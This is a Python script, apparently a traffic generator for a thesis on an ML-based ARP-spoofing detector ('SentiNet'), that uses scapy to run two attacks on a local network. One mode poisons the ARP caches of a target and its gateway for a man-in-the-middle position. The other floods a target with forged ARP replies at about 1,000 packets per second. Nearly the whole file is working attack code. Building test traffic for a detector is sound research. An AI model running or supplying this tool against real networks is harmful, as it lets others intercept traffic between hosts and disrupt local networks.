import time
import sys
import argparse
from scapy.all import ARP, Ether, sendp

def get_mac(ip):
    """
    Helper function to get MAC address for a given IP.
    (Mocked for testing purposes, but can use srp to actual discover).
    """
    # For a real implementation, you would use:
    # ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    # return ans[0][1].hwsrc if ans else None
    return "00:11:22:33:44:55"

def spoof(target_ip, target_mac, spoof_ip):
    """
    Sends a forged ARP response to the target, claiming to be the spoof_ip.
    """
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

def targeted_arp_poisoning(target_ip, gateway_ip):
    """
    Targeted MITM: Tell the target we are the gateway, and tell the gateway we are the target.
    """
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("[AttackGen] Could not find MAC addresses for target/gateway.")
        return

    print(f"[AttackGen] Starting targeted MITM between {target_ip} and {gateway_ip}...")
    try:
        while True:
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            time.sleep(0.02) # ~100 packets per second to match thesis methodology
    except KeyboardInterrupt:
        print("\n[AttackGen] Stopped Targeted Poisoning.")

def arp_flooding(target_ip):
    """
    High-volume ARP flooding (~1,000 PPS) to test Tier-1 Fast-Filter efficiency.
    """
    print(f"[AttackGen] Starting ARP Flooding on {target_ip}...")
    target_mac = get_mac(target_ip)
    if not target_mac:
        target_mac = "ff:ff:ff:ff:ff:ff" # Broadcast if unknown
        
    # ML Engine was trained on datasets where ARP Spoofing triggers a high
    # arp_reply_rate and gratuitous_arp_count. We use op=2 (Reply) and psrc=pdst.
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=target_ip)
    
    try:
        while True:
            sendp(packet, verbose=False)
            time.sleep(0.001) # ~1000 packets per second to match thesis methodology
    except KeyboardInterrupt:
        print("\n[AttackGen] Stopped ARP Flooding.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SentiNet Attack Generator")
    parser.add_argument("mode", choices=["poison", "flood"], help="Attack mode: 'poison' (targeted MITM) or 'flood' (high volume)")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--gateway", help="Gateway IP address (required for 'poison' mode)")
    
    args = parser.parse_args()
    
    if args.mode == "poison":
        if not args.gateway:
            print("Error: --gateway is required for 'poison' mode.")
            sys.exit(1)
        targeted_arp_poisoning(args.target, args.gateway)
    elif args.mode == "flood":
        arp_flooding(args.target)
